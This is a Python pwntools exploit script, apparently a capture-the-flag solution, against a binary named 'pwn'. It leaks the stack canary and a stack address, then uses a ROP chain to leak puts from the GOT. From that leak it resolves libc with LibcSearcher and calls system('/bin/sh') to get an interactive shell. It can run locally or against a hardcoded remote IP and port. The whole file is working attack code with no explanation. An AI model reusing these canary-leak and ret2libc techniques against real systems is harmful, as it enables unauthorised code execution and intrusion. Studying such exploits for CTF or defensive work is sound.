#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
from LibcSearcher import LibcSearcher

context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'pwn'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "121.36.59.116"
remotePort = 9999

LOCAL = 1
LIB   = 0

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)


#--------------------------Exploit--------------------------
def exploit():
	leak_fun = 'puts'
	dp_fun = 'puts'
	pop_rdi = 0x400923
	start = 0x400630
	read_addr = 0x400823

	p = 'a' * 88 + 'A'
	s(p)
	ru('A')
	cannary = u64( '\x00' + r(7))
	stack = u64(ru('\x7f') + '\x7f\x00\x00') - 0
	li( 'cannary: ' + hex(cannary))
	li( 'stack rbp: ' + hex(stack))
	p = 'A' * 88 + p64(cannary) + p64(stack + 0x30)
	p += p64(read_addr) 
	s(p)
	#db()
	p = 'B' * 40 + p64(pop_rdi) + p64(exe.got['puts']) + p64(exe.plt['puts'])
	p += p64(start)
	s(p)

	leak = u64(ru('\x7f')[-5:] + '\x7f\x00\x00')
	libc = LibcSearcher('puts', leak)
	libc_base = leak - libc.dump('puts')
	libc_sys = libc_base + libc.dump('system')
	libc_sh = libc_base + libc.dump('str_bin_sh')
	li('libc_base ' + hex(libc_base))


	p = 'a' * 88 + 'A'
	s(p)
	ru('A')
	cannary = u64( '\x00' + r(7))
	stack = u64(ru('\x7f') + '\x7f\x00\x00') - 0
	li( 'cannary: ' + hex(cannary))
	li( 'stack rbp: ' + hex(stack))
	p = 'A' * 88 + p64(cannary) + p64(stack + 0x30)
	p += p64(read_addr) 
	s(p)

	p = 'B' * 40 + p64(0x40087A) + p64(pop_rdi) + p64(libc_sh) + p64(libc_sys)
	#p += p64(start)
	#db()
	s(p)


def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
